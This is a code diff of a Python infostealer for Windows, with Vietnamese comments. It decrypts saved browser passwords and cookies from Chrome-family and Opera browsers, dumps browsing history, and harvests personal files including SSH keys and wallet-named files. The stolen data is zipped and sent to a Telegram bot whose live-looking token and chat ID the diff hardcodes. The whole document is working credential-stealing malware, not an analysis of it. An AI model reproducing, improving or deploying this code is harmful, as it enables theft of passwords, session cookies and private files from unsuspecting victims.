@@ -23,11 +23,29 @@ import winshell
 from win32com.client import Dispatch
 import winreg as reg
 import win32crypt
+from concurrent.futures import ThreadPoolExecutor
 
 bot_token = 'TOKEN'
 chat_id = 'ID'
 
-class BrowserDataCollector:
+
+import os
+import shutil
+import zipfile
+import requests
+from typing import Union
+import base64
+import json
+import random
+import sqlite3
+import threading
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+
+bot_token = '7481960829:AAFWLAti2xagba2MyBWDHBTChsR3__Ks2gM'
+chat_id = '-1002159253602'
+
+class Browsers:
     def __init__(self):
         self.appdata = os.getenv('LOCALAPPDATA')
         self.roaming = os.getenv('APPDATA')
@@ -50,6 +68,7 @@ class BrowserDataCollector:
             'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
             'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
         }
+
         self.profiles = [
             'Default',
             'Profile 1',
@@ -58,6 +77,7 @@ class BrowserDataCollector:
             'Profile 4',
             'Profile 5',
         ]
+
         self.temp_path = os.path.join(os.path.expanduser("~"), "tmp")
         os.makedirs(os.path.join(self.temp_path, "Browser"), exist_ok=True)
 
@@ -74,7 +94,7 @@ class BrowserDataCollector:
 
             self.masterkey = self.get_master_key(path + '\\Local State')
 
-            self.funcs = [self.extract_passwords, self.extract_history, self.cookies]
+            self.funcs = [self.cookies, self.passwords, self.history]  # Thêm hàm history vào danh sách
 
             for profile in self.profiles:
                 for func in self.funcs:
@@ -87,143 +107,96 @@ class BrowserDataCollector:
 
         self.create_zip_and_send()
 
-    def get_master_key(self, path: str) -> bytes:
+    def get_master_key(self, path: str) -> str:
         try:
             with open(path, "r", encoding="utf-8") as f:
-                local_state = json.load(f)
-            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = encrypted_key[5:]
-            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                c = f.read()
+            local_state = json.loads(c)
+            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            master_key = master_key[5:]
+            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
             return master_key
         except Exception:
-            return b''
+            pass
 
     def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
-        try:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
-            return decrypted_pass
-        except Exception:
-            return ""
-
-    def extract_passwords(self, name: str, path: str, profile: str):
-        user_data_path = os.path.join(path, profile, 'Login Data')
-        if not os.path.isfile(user_data_path):
-            return
-        
-        temp_db_path = self.create_temp()
-        shutil.copy2(user_data_path, temp_db_path)
-        conn = sqlite3.connect(temp_db_path)
-        cursor = conn.cursor()
-        
-        passwords = []
-        for row in cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins"):
-            origin_url, action_url, username, encrypted_password = row
-            decrypted_password = self.decrypt_password(encrypted_password, self.masterkey)
-            if username or decrypted_password:
-                passwords.append({
-                    'browser': name,
-                    'profile': profile,
-                    'origin_url': origin_url,
-                    'action_url': action_url,
-                    'username': username,
-                    'password': decrypted_password
-                })
-
-        cursor.close()
-        conn.close()
-        os.remove(temp_db_path)
-        
-        if passwords:
-            filename = os.path.join(self.temp_path, "Browser", f"{name}_{profile}_passwords.txt")
-            self.save_data_to_file(passwords, filename)
-
-    def extract_history(self, name: str, path: str, profile: str):
-        history_db_path = os.path.join(path, profile, 'History')
-        if not os.path.isfile(history_db_path):
-            return
-
-        temp_db_path = self.create_temp()
-        shutil.copy2(history_db_path, temp_db_path)
-        conn = sqlite3.connect(temp_db_path)
-        cursor = conn.cursor()
-        
-        rows = cursor.execute("SELECT url, title, visit_count FROM urls").fetchall()
-        if rows:
-            filename = os.path.join(self.temp_path, "Browser", f"{name}_{profile}_history.txt")
-            with open(filename, "w", encoding="utf-8") as f:
-                for row in rows:
-                    f.write(f"URL: {row[0]}\nTitle: {row[1]}\nVisit Count: {row[2]}\n\n")
-
-        cursor.close()
-        conn.close()
-        os.remove(temp_db_path)
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
 
     def cookies(self, name: str, path: str, profile: str):
-        if name in ['opera', 'opera-gx']:
+        if name == 'opera' or name == 'opera-gx':
             path += '\\Network\\Cookies'
         else:
             path += '\\' + profile + '\\Network\\Cookies'
         if not os.path.isfile(path):
             return
-
-        temp_db_path = self.create_temp()
-        shutil.copy2(path, temp_db_path)
-        conn = sqlite3.connect(temp_db_path)
+        cookievault = self.create_temp()
+        shutil.copy2(path, cookievault)
+        conn = sqlite3.connect(cookievault)
         cursor = conn.cursor()
-        
         with open(os.path.join(self.temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
             f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
             for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                 host_key, name, path, encrypted_value, expires_utc = res
                 value = self.decrypt_password(encrypted_value, self.masterkey)
-                if host_key and name and value:
+                if host_key and name and value != "":
                     f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
-        
         cursor.close()
         conn.close()
-        os.remove(temp_db_path)
+        os.remove(cookievault)
 
-    def save_data_to_file(self, data, filename):
-        with open(filename, 'w', encoding='utf-8') as file:
-            grouped_data = {}
-            for entry in data:
-                browser = entry['browser']
-                profile = entry['profile']
-                if browser not in grouped_data:
-                    grouped_data[browser] = {}
-                if profile not in grouped_data[browser]:
-                    grouped_data[browser][profile] = []
+    def passwords(self, name: str, path: str, profile: str):
+        if name == 'opera' or name == 'opera-gx':
+            path += '\\Login Data'
+        else:
+            path += '\\' + profile + '\\Login Data'
+        if not os.path.isfile(path):
+            return
+        passwordvault = self.create_temp()
+        shutil.copy2(path, passwordvault)
+        conn = sqlite3.connect(passwordvault)
+        cursor = conn.cursor()
+        with open(os.path.join(self.temp_path, "Browser", "passwords.txt"), 'a', encoding="utf-8") as f:
+            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
+            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
+                origin_url, username, encrypted_password = res
+                decrypted_password = self.decrypt_password(encrypted_password, self.masterkey)
+                if origin_url and username and decrypted_password:
+                    f.write(f"{origin_url}\t{username}\t{decrypted_password}\n")
+        cursor.close()
+        conn.close()
+        os.remove(passwordvault)
 
-                grouped_data[browser][profile].append(entry)
-
-            for browser, profiles in grouped_data.items():
-                for profile, entries in profiles.items():
-                    file.write(f"Browser: {browser} | Profile: {profile}\n")
-                    file.write(f"{'Website':<80} | {'Username':<30} | {'Password':<30}\n")
-                    file.write("=" * 140 + "\n")
-
-                    for entry in entries:
-                        website = entry['origin_url']
-                        username = entry.get('username', 'N/A')
-                        password = entry.get('password', 'N/A')
-                        file.write(f"{website:<80} | {username:<30} | {password:<30}\n")
-
-                    file.write("=" * 140 + "\n")
-
-    def create_zip(self, file_paths: list, zip_path: str):
-        with zipfile.ZipFile(zip_path, 'w') as zipf:
-            for file in file_paths:
-                if os.path.isfile(file):
-                    zipf.write(file, os.path.basename(file))
+    def history(self, name: str, path: str, profile: str):
+        if name == 'opera' or name == 'opera-gx':
+            path += '\\History'
+        else:
+            path += '\\' + profile + '\\History'
+        if not os.path.isfile(path):
+            return
+        historyvault = self.create_temp()
+        shutil.copy2(path, historyvault)
+        conn = sqlite3.connect(historyvault)
+        cursor = conn.cursor()
+        with open(os.path.join(self.temp_path, "Browser", "history.txt"), 'a', encoding="utf-8") as f:
+            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
+            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
+                url, title, visit_count, last_visit_time = res
+                f.write(f"URL: {url}\nTitle: {title}\nVisit Count: {visit_count}\nLast Visit Time: {last_visit_time}\n\n")
+        cursor.close()
+        conn.close()
+        os.remove(historyvault)
 
     def create_zip_and_send(self):
-        # Tạo tệp zip chứa tất cả các tệp
+        # Tạo tệp zip chứa các tệp cookie, mật khẩu và lịch sử duyệt web
         file_paths = [
             os.path.join(self.temp_path, "Browser", "cookies.txt"),
-            *[os.path.join(self.temp_path, "Browser", f) for f in os.listdir(os.path.join(self.temp_path, "Browser")) if f.endswith('_passwords.txt') or f.endswith('_history.txt')]
+            os.path.join(self.temp_path, "Browser", "passwords.txt"),  # Thêm tệp passwords.txt
+            os.path.join(self.temp_path, "Browser", "history.txt")     # Thêm tệp history.txt
         ]
         zip_file_path = os.path.join(self.temp_path, "BrowserData.zip")
         self.create_zip(file_paths, zip_file_path)
@@ -235,6 +208,12 @@ class BrowserDataCollector:
                 os.remove(file)
         if os.path.isfile(zip_file_path):
             os.remove(zip_file_path)
+
+    def create_zip(self, file_paths: list, zip_path: str):
+        with zipfile.ZipFile(zip_path, 'w') as zipf:
+            for file in file_paths:
+                if os.path.isfile(file):
+                    zipf.write(file, os.path.basename(file))
 
     def send_file_to_telegram(self, file_path: str):
         url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
@@ -250,13 +229,16 @@ class BrowserDataCollector:
             print("Failed to send file:", response.text)
         return response
 
-    def create_temp(self) -> str:
-        if not os.path.exists(self.temp_path):
-            os.makedirs(self.temp_path)
+    def create_temp(self, _dir: Union[str, os.PathLike] = None):
+        if _dir is None:
+            _dir = os.path.expanduser("~/tmp")
+        if not os.path.exists(_dir):
+            os.makedirs(_dir)
         file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
-        path = os.path.join(self.temp_path, file_name)
+        path = os.path.join(_dir, file_name)
         open(path, "x").close()
         return path
+
 
 class PcInfo:
     def __init__(self):
@@ -459,30 +441,30 @@ class CommonFiles:
             "Desktop", "Personal", "Downloads", "My Pictures", "My Music", "My Videos", "Documents"
         ]
         
-        paths = [ _get_user_folder_path(folder) for folder in personal_folders ]
+        paths = [_get_user_folder_path(folder) for folder in personal_folders]
 
         if not os.path.exists(temp_path):
             os.makedirs(temp_path)
 
         self.files_to_zip = []
 
-        # Chỉ duyệt qua các thư mục cá nhân
-        for search_path in paths:
-            if search_path and os.path.isdir(search_path):
-                self._process_directory(search_path)
+        # Sử dụng ThreadPoolExecutor để duyệt các thư mục song song
+        with ThreadPoolExecutor() as executor:
+            executor.map(self._process_directory, filter(lambda p: p and os.path.isdir(p), paths))
 
     def _process_directory(self, directory):
         try:
-            for entry in os.listdir(directory):
-                full_path = os.path.join(directory, entry)
-                if os.path.isfile(full_path):
-                    if (any(x in entry.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")) 
-                        or entry.endswith((".txt", ".rtf", ".odt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".ods", ".json", ".ppk", ".jpg", ".jpeg", ".png", ".gif"))) \
-                        and not entry.endswith(".lnk") \
-                        and 0 < os.path.getsize(full_path) < 48 * 1024 * 1024: 
-                        self.files_to_zip.append(full_path)
-                elif os.path.isdir(full_path):
-                    self._process_directory(full_path)
+            # Sử dụng os.scandir để lấy thông tin file nhanh hơn
+            with os.scandir(directory) as entries:
+                for entry in entries:
+                    if entry.is_file():
+                        if (any(x in entry.name.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")) 
+                            or entry.name.endswith((".txt", ".rtf", ".odt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".ods", ".json", ".ppk", ".jpg", ".jpeg", ".png", ".gif"))) \
+                            and not entry.name.endswith(".lnk") \
+                            and 0 < entry.stat().st_size < 48 * 1024 * 1024: 
+                            self.files_to_zip.append(entry.path)
+                    elif entry.is_dir():
+                        self._process_directory(entry.path)
         except PermissionError:
             pass
 
@@ -504,10 +486,9 @@ class CommonFiles:
         except FileNotFoundError:
             print(f'File {self.zipfile} not found.')
 
-
 def main():
     wait_for_network()   
-    BrowserDataCollector()  
+    Browsers() 
     PcInfo()      
     Wifi()   
     CommonFiles()
